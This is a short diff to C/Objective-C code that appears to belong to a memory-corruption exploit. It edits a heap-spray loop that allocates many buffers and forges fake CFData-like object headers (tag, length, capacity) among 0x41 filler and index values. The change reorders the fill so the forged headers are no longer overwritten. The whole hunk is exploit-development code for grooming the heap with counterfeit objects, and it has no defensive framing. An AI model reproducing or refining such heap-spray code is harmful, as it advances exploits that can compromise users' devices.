@@ -1263,17 +1263,18 @@ cleanup:
     if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
     int got = 0, holes = 0;
 
-    // Fill: CFData-like objects {u64 tag=0x43464441; u32 length=0x100; u32 pad; u8 data[]}
+    // Fill: CFData-like objects {u64 tag; u32 length; u32 pad; u8 data[]}
+    // 16-byte objects: +0=tag, +8=length, +12=capacity. Data fill in gaps only.
     for (int i = 0; i < NBUFS; i++) {
         void *b = malloc(spraySz);
         if (!b) break;
         uint8_t *p = (uint8_t *)b;
+        memset(p, 0x41, spraySz);  // base fill first
         for (size_t o = 0; o + 16 <= spraySz - 8; o += 16) {
-            *(uint64_t *)(p + o) = 0x4346444154410001ULL;  // tag 'CFDATA\0\1'
+            *(uint64_t *)(p + o) = 0x4346444154410001ULL;  // tag
             *(uint32_t *)(p + o + 8) = 0x00000100;          // length = 256
             *(uint32_t *)(p + o + 12) = 0x00000200;         // capacity
         }
-        memset(p + 16, 0x41, spraySz - 16);  // data fill
         *(uint64_t *)(p + spraySz - 8) = (uint64_t)i;
         bufs[i] = b;
         got++;
